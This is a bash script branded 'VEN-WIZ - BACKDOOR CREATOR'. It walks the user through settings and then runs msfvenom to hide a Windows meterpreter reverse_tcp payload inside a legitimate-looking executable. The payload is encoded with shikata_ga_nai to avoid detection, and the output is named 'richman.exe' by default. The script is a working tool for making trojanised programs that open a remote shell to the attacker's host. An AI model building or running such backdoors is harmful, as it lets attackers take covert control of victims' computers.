#!/bin/bash


default="\e[39m"



function banner {
    echo -e "\e[33m
	====================================================================
	                        L I B E R T Y  'X'
	====================================================================
	'##::::'##:'########:'##::: ##::::::::::'##:::::'##:'####:'########:
	 ##:::: ##: ##.....:: ###:: ##:::::::::: ##:'##: ##:. ##::..... ##::
	 ##:::: ##: ##::::::: ####: ##:::::::::: ##: ##: ##:: ##:::::: ##:::
	 ##:::: ##: ######::: ## ## ##:'#######: ##: ##: ##:: ##::::: ##::::
	. ##:: ##:: ##...:::: ##. ####:........: ##: ##: ##:: ##:::: ##:::::
	:. ## ##::: ##::::::: ##:. ###:::::::::: ##: ##: ##:: ##::: ##::::::
	::. ###:::: ########: ##::. ##::::::::::. ###. ###::'####: ########:
	:::...:::::........::..::::..::::::::::::...::...:::....::........::
	by lib3rtyX<alexB>
	====================================================================
	                   VEN-WIZ - BACKDOOR CREATOR
	====================================================================
	$default"
}

function init {
    INEXE=""
    ERROR=false
    IP=$(hostname -I)

    echo -e "\e[32m[*] Get local ip..."

    ARCH=${ARCH:-x86}
    PLATTF=${PLATTF:-Windows}
    PAYLOAD=${PAYLOAD:-windows/meterpreter/reverse_tcp}
    LHOST=${LHOST:-$IP}
    LPORT=${LPORT:-1088}
    OUTFMT=${OUTFMT:-exe}
    OUT=${OUT:-richman.exe}

    echo -e "[*] Setting default values done..."

    if [ -e /usr/bin/msfvenom ];then

	echo -e "[*] Dependencies exist. Good.."
	VENOM="/usr/bin/msfvenom"

    else

	echo -e "\e[91m[!] ERROR. Dependencies not met...Where is msfvenom?\e[39m"
	read VENOM

	if [ -e $VENOM ];then
	    echo -e "\e[91m[!]EXIT...Cant find msfvenom at $VENOM\e[39m"
	    exit 1
	fi
    fi

    echo -e "[*] Starting VEN-WIZ...thanks 4 using!"
    echo "<VenWiz>  Copyright (C) <2016>  <alexander bachmer>
This program comes with ABSOLUTELY NO WARRANTY;
This is free software, and you are welcome to redistribute it
under certain conditions; Look in soure for details.
"
    sleep 1
}

function choose_Arch {
    read -p "[?] Please select architecture:[Default=x86] " ARCH
    ARCH=${ARCH:-x86}
}

function choose_Plattf {
    read -p "[?] Please select target platform:[DEFAULT=windows] " PLATTF
    PLATTF=${PLATTF:-windows}
}

function choose_Infile {
    read -p "[?] Please select display program: " INEXE

    if [ ! -e $INEXE ];then

	echo -e "\e[31m[!] Program or path not found!"
	echo -e "[!] INPUT: $INEXE. Proceed with [ENTER]$default"
	INEXE=""
	ERROR=true
	read

    else
	echo -e "\e[32m[*] Parameter $INEXE succesfully taken. Proceed with [ENTER]$default"
	read
    fi
}

function choose_Payload {
    read -p "[?] Please select payload:[DEFAULT=reverse_tcp] " PAYLOAD

    PAYLOAD=${PAYLOAD:-windows/meterpreter/reverse_tcp}
}

function choose_Lhost {
    IP=$(hostname -I)

    read -p "[?] Please select local host:[DEFAULT=$IP]" LHOST

    LHOST=${LHOST:-$IP}
}

function choose_Lport {
    read -p "[?] Please select local port:[DEFAULT=1088] "LPORT

    LPORT=${LPORT:-1088}
}

function choose_Fmt {

    read -p "[?] Please select your binary format:[DEFAULT=exe]" OUTFMT

    OUTFMT=${OUTFMT:-exe}
}

function choose_Out {
    read -p "[?] Please name your output:[DEFAULT=richman.exe]" OUT

    OUT=${OUT:-richman.exe}
}


function wizard {
    choose_Arch

    choose_Plattf

    choose_Infile
    
    choose_Payload
    
    choose_Lhost
    
    choose_Lport

    choose_Fmt
    
    choose_Out
    
    selectArgs
}
function exploit {
    echo -e "\e[32m[*] Start exploit function"
    echo -e "[*] Check display program: $INEXE $default"
    if [ ! -e "$INEXE" ];then

	echo -e "\e[91m[!] Display program is not set!\e[39m"
	choose_Infile

	if [ $ERROR = true ];then

	    ERROR=false
	    main

	fi
    fi

    if [ -e $VENOM ];then

	echo -e "[*] Show Overview:";showArgs
	echo -e "\e[33m[*] Starting wrapper..."
	echo -e "\e[33m[*] msfvenom -a $ARCH --platform $PLATTF -x $INEXE -k -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 3 -b "\x00" -f $OUTFMT -o $OUT"

	msfvenom -a $ARCH --platform $PLATTF -x $INEXE -k -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 3 -b "\x00" -f $OUTFMT -o $OUT

	if [ $? == "0" ];then

	    echo -e "\e[32m[*] Wrapping successful"
	    echo -e "[*] File saved as: $(pwd)/$OUT!"
	    read -p "Please proceed with [ENTER]..Bye"
	    exit 

	else

	    echo -e "\e[91m[!] Error while wrapping. Exitcode $?"
	    exit 1

	fi

    else

	echo -e "\e[91m[!] Dependencies not met! ERROR msfvenom not found!"
	echo "$VENOM"
	read
	main

    fi
}
function main {
    echo -e "$default"
    banner
    echo "=== MAIN-MENU ==="
    echo "-----------------------------------------------------------"
    echo "[1] Overview"
    echo "[2] Wizard"
    echo "[3] RUN"
    echo "[0] QUIT"
    echo "-----------------------------------------------------------"
    read wahl
    if [ $wahl == "1" ];then
	selectArgs
    elif [ $wahl == "2" ];then
	wizard
    elif [ $wahl == "3" ];then
	exploit
    elif [ $wahl == "0" ];then
	exit
    else
	main
    fi
}

function showArgs {
    echo -e "$default"
    echo "=== OVERVIEW ==="
    echo "-----------------------------------------------------------"
    echo "[1] ARCH             = $ARCH"
    echo "[2] Platform         = $PLATTF"
    echo "[3] Display Programm = $INEXE"
    echo "[4] Payload          = $PAYLOAD"
    echo "[5] Local Host       = $LHOST"
    echo "[6] Local Port       = $LPORT"
    echo "[7] Format           = $OUTFMT"
    echo "[8] OUTPUT           = $OUT"
    echo "[9] RUN"
    echo "[0] MAINMENU"
    echo "-----------------------------------------------------------"
    echo ""
}
function selectArgs {
    showArgs
    fastWiz
}

function fastWiz {
    echo -e "$default"
    read -p "Please choose [0 - 8]" wahl
    if [ $wahl == "1" ];then
	choose_Arch
	selectArgs
    elif [ $wahl == "2" ];then
	choose_Plattf
	selectArgs
    elif [ $wahl == "3" ];then
	choose_Infile
	selectArgs
    elif [ $wahl == "4" ];then
	choose_Payload
	selectArgs
    elif [ $wahl == "5" ];then
	choose_Lhost
	selectArgs
    elif [ $wahl == "6" ];then
	choose_Lport
	selectArgs
    elif [ $wahl == "7" ];then
	choose_Fmt
	selectArgs
    elif [ $wahl == "8" ];then
	choose_Out
	selectArgs
    elif [ $wahl == "9" ];then
	exploit
    else
	main
    fi
}
init
main